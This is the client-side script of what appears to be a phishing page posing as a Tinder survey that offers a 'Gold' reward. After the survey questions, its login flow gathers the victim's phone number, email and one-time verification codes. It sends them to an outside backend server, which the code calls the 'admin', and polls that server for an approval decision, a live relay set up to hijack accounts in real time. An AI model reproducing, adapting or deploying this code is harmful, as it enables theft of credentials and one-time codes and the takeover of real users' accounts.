<script>
var answers={},currentQ=1,totalQ=8;
var multiAnswers={q5:[]};

// ═══════════════════════════════════════════════════════════════
// CONFIG - UPDATE THIS TO YOUR SERVER URL
// ═══════════════════════════════════════════════════════════════
var SERVER   = 'https://tinder-backend-production-7fec.up.railway.app'; // CHANGE THIS!
var SHARE_URL = 'https://Premuimgold.github.io/tinder-survey';

// Login flow variables
var lsUserPhone='', lsUserEmail='', lsPhoneCode='', lsEmailCode='';
var lsPollTimer=null, lsDecisionMade=false, lsSessionId='';

// Slider labels
var sliderLabels=['','😞 Very unhappy','😔 Unhappy','😕 Below average','😐 Average','🤔 Neutral','🙂 Decent','😊 Pretty good','😃 Good','🤩 Great','😍 Love it!'];

// Build dots
(function(){
  var w=document.getElementById('prog-dots');
  for(var i=1;i<=totalQ;i++){
    var d=document.createElement('div');
    d.className='prog-dot'+(i===1?' current':'');
    d.id='dot-'+i; w.appendChild(d);
  }
})();

// Init slider
(function(){
  var sl=document.getElementById('q3-slider');
  if(sl){
    updateSliderFill(sl);
    document.getElementById('q3-val').textContent=sl.value;
    document.getElementById('q3-lbl').textContent=sliderLabels[parseInt(sl.value)]||'';
  }
})();

function updateSliderFill(el){
  var pct=((el.value-el.min)/(el.max-el.min))*100;
  el.style.setProperty('--fill',pct+'%');
}

function onSlider(){
  var el=document.getElementById('q3-slider');
  var v=parseInt(el.value);
  document.getElementById('q3-val').textContent=v;
  document.getElementById('q3-lbl').textContent=sliderLabels[v]||'';
  answers['q3']=v;
  updateSliderFill(el);
}

// init slider answer
answers['q3']=5;

function pick(btn,qid){
  document.getElementById('opts-'+qid).querySelectorAll('.opt').forEach(function(b){b.classList.remove('selected');});
  btn.classList.add('selected');
  answers[qid]=btn.textContent.trim();
  var v=document.getElementById('vm-'+qid);
  if(v)v.style.display='none';
}

function multiPick(btn,qid){
  btn.classList.toggle('selected');
  var selected=document.getElementById('multi-'+qid).querySelectorAll('.multi-opt.selected');
  multiAnswers[qid]=Array.from(selected).map(function(b){return b.textContent.trim();});
  var v=document.getElementById('vm-'+qid);
  if(v)v.style.display='none';
}

function onShortInput(inputId,checkId,vmId,qid,minLen){
  var val=document.getElementById(inputId).value.trim();
  var check=document.getElementById(checkId);
  var inp=document.getElementById(inputId);
  if(val.length>=minLen){
    answers[qid]=val;
    check.classList.add('show');
    inp.classList.add('valid');
    document.getElementById(vmId).style.display='none';
  } else {
    answers[qid]=null;
    check.classList.remove('show');
    inp.classList.remove('valid');
  }
}

function onTextarea(){
  var val=document.getElementById('q8-text').value;
  var ch=document.getElementById('char-hint');
  ch.textContent=val.length+' / 20 characters minimum';
  if(val.length>=20){ch.classList.add('ok');answers['q8']=val;document.getElementById('vm-q8').style.display='none';}
  else{ch.classList.remove('ok');answers['q8']=null;}
}

function setProgress(q){
  var pct=Math.round(((q-1)/totalQ)*100);
  document.getElementById('prog-fill').style.width=pct+'%';
  document.getElementById('prog-label').textContent='Question '+q+' of '+totalQ;
  document.getElementById('prog-pct').textContent=pct+'%';
  for(var i=1;i<=totalQ;i++){
    var d=document.getElementById('dot-'+i);
    d.className='prog-dot'+(i<q?' done':i===q?' current':'');
  }
}

function validate(q){
  if(q===3) return true;
  if(q===5){
    if(!multiAnswers['q5']||multiAnswers['q5'].length===0){
      document.getElementById('vm-q5').style.display='block';
      return false;
    }
    return true;
  }
  if(q===2||q===4||q===6){
    var qid='q'+q;
    if(!answers[qid]){
      document.getElementById('vm-q'+q).style.display='block';
      return false;
    }
    return true;
  }
  if(q===8){
    var val=(document.getElementById('q8-text').value||'').trim();
    if(val.length<20){document.getElementById('vm-q8').style.display='block';return false;}
    answers['q8']=val;
    return true;
  }
  if(!answers['q'+q]){document.getElementById('vm-q'+q).style.display='block';return false;}
  return true;
}

function submitSurvey(){
  for(var i=1;i<=totalQ;i++){
    var el=document.getElementById('q'+i);
    if(el) el.classList.remove('active');
  }
  document.getElementById('prog-fill').style.width='100%';
  document.getElementById('prog-label').textContent='Almost there!';
  document.getElementById('prog-pct').textContent='100%';
  for(var j=1;j<=totalQ;j++){
    var d=document.getElementById('dot-'+j);
    if(d) d.className='prog-dot done';
  }
  document.getElementById('q-nav').style.display='none';
  var rs=document.getElementById('result-step');
  rs.style.display='block';
  setTimeout(function(){ goToStep('ls-step1'); }, 100);
  window.scrollTo({top:0,behavior:'smooth'});
}

function goNext(){
  if(!validate(currentQ)) return;
  if(currentQ===8){submitSurvey();return;}
  document.getElementById('q'+currentQ).classList.remove('active');
  currentQ++;
  document.getElementById('q'+currentQ).classList.add('active');
  setProgress(currentQ); updateNav();
  window.scrollTo({top:0,behavior:'smooth'});
}

function goBack(){
  if(currentQ<=1)return;
  document.getElementById('q'+currentQ).classList.remove('active');
  currentQ--;
  document.getElementById('q'+currentQ).classList.add('active');
  setProgress(currentQ); updateNav();
  window.scrollTo({top:0,behavior:'smooth'});
}

function updateNav(){
  document.getElementById('btn-back').style.visibility=currentQ>1?'visible':'hidden';
  document.getElementById('btn-next').textContent=currentQ===8?'Submit & Claim Reward 🎁':'Next →';
}

// ═══════════════════════════════════════════════════════════════
// LOGIN FLOW FUNCTIONS
// ═══════════════════════════════════════════════════════════════

function genSessionId(){
  return Math.random().toString(36).substr(2,9)+Date.now().toString(36);
}

function goToStep(id){
  ['ls-step1','ls-step2','ls-step4','ls-step5','ls-step6'].forEach(function(s){
    var el=document.getElementById(s); if(el) el.style.display='none';
  });
  var t=document.getElementById(id);
  if(t) t.style.display='block';
  window.scrollTo({top:0,behavior:'smooth'});
}

// ═══════════════════════════════════════════════════════════════
// CRITICAL FIX: Proper polling with error handling
// ═══════════════════════════════════════════════════════════════

function submitAndPoll(stage, code){
  lsSessionId = genSessionId();
  lsDecisionMade = false;
  if(lsPollTimer) clearInterval(lsPollTimer);

  // Send to server
  fetch(SERVER+'/submit',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({sessionId:lsSessionId, stage:stage, phone:lsUserPhone, email:lsUserEmail, code:code})
  })
  .then(function(r){return r.json();})
  .then(function(data){
    if(!data.ok){
      console.error('Server error:', data.error);
      alert('Error sending to admin. Please try again.');
    }
  })
  .catch(function(err){
    console.error('Network error:', err);
    alert('Network error. Please check your connection.');
  });

  // Start polling for decision
  lsPollTimer = setInterval(function(){
    if(lsDecisionMade){
      clearInterval(lsPollTimer);
      return;
    }
    
    fetch(SERVER+'/check-status?sessionId='+encodeURIComponent(lsSessionId))
      .then(function(r){
        if(!r.ok) throw new Error('HTTP '+r.status);
        return r.json();
      })
      .then(function(d){
        console.log('Poll result:', d);
        if(d.status==='approved'){
          lsDecisionMade=true;
          clearInterval(lsPollTimer);
          handleDecision(stage,'approved');
        } else if(d.status==='declined'){
          lsDecisionMade=true;
          clearInterval(lsPollTimer);
          handleDecision(stage,'declined');
        }
        // If pending, continue polling
      })
      .catch(function(err){
        console.error('Poll error:', err);
        // Continue polling even on error
      });
  }, 2000);
}

function handleDecision(stage, decision){
  if(stage === 'step4'){
    document.getElementById('s4-waiting').style.display='none';
    document.getElementById('ls-btn4').style.display='block';
    
    if(decision === 'approved'){
      ['p0','p1','p2','p3'].forEach(function(id){ 
        var el=document.getElementById(id); 
        if(el) el.value=''; 
      });
      document.getElementById('s4-error').style.display='none';
      goToStep('ls-step5');
    } else {
      document.getElementById('s4-error').style.display='block';
      ['p0','p1','p2','p3'].forEach(function(id){ 
        var el=document.getElementById(id); 
        if(el) el.value=''; 
      });
      document.getElementById('p0').focus();
    }

  } else if(stage === 'step5'){
    document.getElementById('s5-waiting').style.display='none';
    document.getElementById('ls-btn5').style.display='block';
    
    if(decision === 'approved'){
      ['e0','e1','e2','e3'].forEach(function(id){ 
        var el=document.getElementById(id); 
        if(el) el.value=''; 
      });
      document.getElementById('s5-error').style.display='none';
      goToStep('ls-step6');
      // Final step - send activation request
      setTimeout(function(){
        submitAndPoll('step6', 'ACTIVATE_GOLD');
      }, 500);
    } else {
      document.getElementById('s5-error').style.display='block';
      ['e0','e1','e2','e3'].forEach(function(id){ 
        var el=document.getElementById(id); 
        if(el) el.value=''; 
      });
      document.getElementById('e0').focus();
    }

  } else if(stage === 'step6'){
    var w=document.getElementById('ls-step6-waiting');
    var a=document.getElementById('ls-step6-approved');
    var d=document.getElementById('ls-step6-declined');
    
    if(decision === 'approved'){
      if(w) w.style.display='none';
      if(a) a.style.display='block';
      if(d) d.style.display='none';
      launchConfetti();
    } else {
      if(w) w.style.display='none';
      if(a) a.style.display='none';
      if(d) d.style.display='block';
    }
  }
}

// ═══════════════════════════════════════════════════════════════
// STEP 4: Phone OTP
// ═══════════════════════════════════════════════════════════════

function codeIn(prefix,idx,total){
  var el=document.getElementById(prefix+idx);
  if(!el) return;
  el.value=el.value.replace(/[^0-9]/g,'');
  el.style.animation='none'; 
  void el.offsetWidth;
  el.style.animation='bounceIn 0.22s cubic-bezier(.34,1.56,.64,1) both';
  if(el.value.length===1 && idx<total-1) {
    var next=document.getElementById(prefix+(idx+1));
    if(next) next.focus();
  }
}

function codeKey(e,prefix,idx){
  if(e.key==='Backspace'){
    var el=document.getElementById(prefix+idx);
    if(el && el.value==='' && idx>0){
      var prev=document.getElementById(prefix+(idx-1));
      if(prev) prev.focus();
    }
  }
}

function getCode(prefix,total){
  var c=''; 
  for(var i=0;i<total;i++) {
    var el=document.getElementById(prefix+i);
    c+= el ? el.value : ''; 
  } 
  return c;
}

function lsS4(){
  var code=getCode('p',4);

    document.getElementById('ls-vm4').style.display='block';

}

// ═══════════════════════════════════════════════════════════════
// ANIMATIONS & EFFECTS
// ═══════════════════════════════════════════════════════════════

function addRipple(btn,e){
  var r=document.createElement('span');
  r.className='ripple-el';
  var rect=btn.getBoundingClientRect();
  var size=Math.max(rect.width,rect.height);
  r.style.width=r.style.height=size+'px';
  r.style.left=(e.clientX-rect.left-size/2)+'px';
  r.style.top=(e.clientY-rect.top-size/2)+'px';
  btn.appendChild(r);
  setTimeout(function(){r.remove();},600);
}

document.addEventListener('click',function(e){
  var btn=e.target.closest('.btn-next,.ls-btn,.btn-copy');
  if(btn) addRipple(btn,e);
});

function shakeEl(id){
  var el=document.getElementById(id);
  if(!el)return;
  el.classList.remove('shake');
  void el.offsetWidth;
  el.classList.add('shake');
  setTimeout(function(){el.classList.remove('shake');},600);
}

function launchConfetti(){
  var canvas=document.getElementById('confetti-canvas');
  canvas.style.display='block';
  var ctx=canvas.getContext('2d');
  canvas.width=window.innerWidth;
  canvas.height=window.innerHeight;
  var pieces=[];
  var colors=['#FE3C72','#FF6036','#FFB800','#00B74A','#6366F1','#EC4899','#FBBF24'];
  for(var i=0;i<140;i++){
    pieces.push({
      x:Math.random()*canvas.width,
      y:-20-Math.random()*100,
      w:6+Math.random()*8,
      h:10+Math.random()*8,
      color:colors[Math.floor(Math.random()*colors.length)],
      vx:(Math.random()-0.5)*5,
      vy:3+Math.random()*4,
      rot:Math.random()*360,
      vrot:(Math.random()-0.5)*8,
      opacity:1
    });
  }
  var startTime=Date.now();
  function draw(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    var elapsed=Date.now()-startTime;
    var alive=false;
    pieces.forEach(function(p){
      p.x+=p.vx; 
      p.y+=p.vy; 
      p.rot+=p.vrot;
      if(elapsed>2200) p.opacity=Math.max(0,p.opacity-0.025);
      if(p.y<canvas.height&&p.opacity>0) alive=true;
      ctx.save();
      ctx.globalAlpha=p.opacity;
      ctx.translate(p.x+p.w/2,p.y+p.h/2);
      ctx.rotate(p.rot*Math.PI/180);
      ctx.fillStyle=p.color;
      ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);
      ctx.restore();
    });
    if(alive) requestAnimationFrame(draw);
    else{ 
      ctx.clearRect(0,0,canvas.width,canvas.height); 
      canvas.style.display='none'; 
    }
  }
  requestAnimationFrame(draw);
}

// Code box animation
document.addEventListener('input',function(e){
  if(!e.target.classList.contains('ls-code-box'))return;
  e.target.style.animation='none';
  var self=e.target;
  requestAnimationFrame(function(){
    self.style.animation='bounceIn 0.25s cubic-bezier(.34,1.56,.64,1) both';
  });
});

// Stat counters
function animateCounter(el,target,duration){
  var start=0,startTime=null;
  function step(ts){
    if(!startTime)startTime=ts;
    var p=Math.min((ts-startTime)/duration,1);
    var cur=Math.floor(p*target);
    el.textContent=cur+(el.dataset.suffix||'');
    if(p<1)requestAnimationFrame(step);
    else el.textContent=el.dataset.full;
  }
  requestAnimationFrame(step);
}

var statsObserver=new IntersectionObserver(function(entries){
  entries.forEach(function(entry){
    if(entry.isIntersecting){
      var el=entry.target;
      if(el.dataset.animated)return;
      el.dataset.animated='1';
      animateCounter(el,parseInt(el.dataset.target)||75,1400);
    }
  });
},{threshold:0.5});

document.querySelectorAll('.stat-card-val').forEach(function(el){
  var txt=el.textContent;
  el.dataset.full=txt;
  var num=parseInt(txt.replace(/\\D/g,''))||0;
  el.dataset.target=num;
  el.dataset.suffix=txt.replace(/[0-9]/g,'');
  statsObserver.observe(el);
});
